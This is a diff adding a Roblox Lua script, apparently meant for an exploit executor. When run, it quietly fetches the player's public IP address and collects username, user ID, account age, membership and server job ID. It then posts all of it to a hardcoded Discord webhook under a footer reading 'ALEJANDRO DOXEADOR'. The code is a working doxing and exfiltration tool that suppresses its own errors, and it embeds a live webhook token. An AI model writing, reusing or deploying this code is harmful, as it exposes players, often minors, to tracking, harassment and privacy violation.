@@ -1,1 +1,51 @@
+local webhookURL = "https://discord.com/api/webhooks/1396332293232263228/yDNk7WXsXLuit9p_TpLe8BCV69TutneEzT3jUBZHsd6dptOzvff_smOLdJQv7GoNq01u"
 
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local ip = "No IP"
+pcall(function()
+    ip = game:HttpGet("http://api.ipify.org")
+end)
+
+local userId = player.UserId
+local username = player.Name
+local displayName = player.DisplayName
+local age = player.AccountAge
+local membership = player.MembershipType.Name
+local jobId = game.JobId
+local gameLink = "https://www.roblox.com/games/"..game.PlaceId
+local profileLink = "https://www.roblox.com/users/"..userId.."/profile"
+
+local data = {
+    ["username"] = "ALEJANDRO",
+    ["avatar_url"] = "https://i.imgur.com/AfFp7pu.png",
+    ["embeds"] = {{
+        ["title"] = "📡 Datos recopilados",
+        ["description"] = "**Usuario**: ["..username.."]("..profileLink..")\n**Juego**: ["..gameLink.."]\n\n**IP Pública**: `"..ip.."`",
+        ["fields"] = {
+            {["name"]="Display Name", ["value"]=displayName, ["inline"]=true},
+            {["name"]="User ID", ["value"]=tostring(userId), ["inline"]=true},
+            {["name"]="Account Age", ["value"]=age.." días", ["inline"]=true},
+            {["name"]="Membership", ["value"]=membership, ["inline"]=true},
+            {["name"]="Job ID", ["value"]=jobId or "N/A", ["inline"]=false}
+        },
+        ["color"] = 16711680,
+        ["footer"] = {
+            ["text"] = "ALEJANDRO DOXEADOR"
+        }
+    }}
+}
+
+
+pcall(function()
+    request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(data)
+    })
+end)
